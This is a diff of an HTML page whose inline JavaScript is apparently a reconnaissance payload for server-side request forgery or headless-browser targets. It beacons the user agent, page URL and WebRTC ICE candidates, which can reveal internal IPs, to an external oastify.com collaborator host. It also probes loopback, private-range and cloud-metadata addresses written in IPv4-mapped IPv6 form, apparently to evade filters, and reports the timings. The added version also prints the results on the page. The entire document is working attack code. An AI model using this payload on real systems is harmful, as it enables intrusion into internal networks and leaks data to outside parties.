@@ -1,10 +1,12 @@
-<!doctype html><html><body><script>
-var C="https://2twt5r1lvnw0h563n4t4bdxorfx7lp368ncpq2f.oastify.com";
-function rep(t,v){try{new Image().src=C+"/r?t="+t+"&v="+encodeURIComponent(String(v).slice(0,200))+"&n="+Math.random();}catch(e){}}
-rep("ua",navigator.userAgent);rep("href",location.href);
+<!doctype html><html><head><meta charset=utf-8><style>body{font:28px monospace;background:#fff;color:#000;padding:10px}</style></head>
+<body><div id=o>RECON-START</div><script>
+var C="https://2twt5r1lvnw0h563n4t4bdxorfx7lp368ncpq2f.oastify.com";var O=document.getElementById("o");
+function show(t,v){O.innerHTML+="<div>"+t+": "+String(v).replace(/</g,"&lt;").slice(0,300)+"</div>";try{new Image().src=C+"/r?t="+t+"&v="+encodeURIComponent(String(v).slice(0,200))+"&n="+Math.random();}catch(e){}}
+show("ua",navigator.userAgent);show("href",location.href);
 try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel("x");
-pc.onicecandidate=function(e){if(e&&e.candidate)rep("ice",e.candidate.candidate);};
-pc.createOffer().then(function(o){return pc.setLocalDescription(o);});}catch(e){rep("rtcerr",e.message);}
+pc.onicecandidate=function(e){if(e&&e.candidate)show("ICE",e.candidate.candidate);};
+pc.createOffer().then(function(o){return pc.setLocalDescription(o);});}catch(e){show("rtcerr",e.message);}
 var T=["https://[::ffff:127.0.0.1]/","https://[::ffff:10.0.0.1]/","https://[::ffff:172.17.0.1]/","https://[::ffff:172.16.0.1]/","https://[::ffff:192.168.0.1]/","https://[::ffff:169.254.169.254]/"];
-T.forEach(function(u){var s=Date.now();fetch(u,{mode:"no-cors"}).then(function(){rep("fok",u);}).catch(function(err){rep("ferr",u+"|"+(Date.now()-s)+"|"+(err&&err.message));});});
-</script>recon-loaded</body></html>
+T.forEach(function(u){var s=Date.now();fetch(u,{mode:"no-cors"}).then(function(){show("FOK",u);}).catch(function(err){show("FERR",u+" "+(Date.now()-s)+"ms "+(err&&err.message));});});
+setTimeout(function(){show("done","t+3s");},3000);
+</script></body></html>
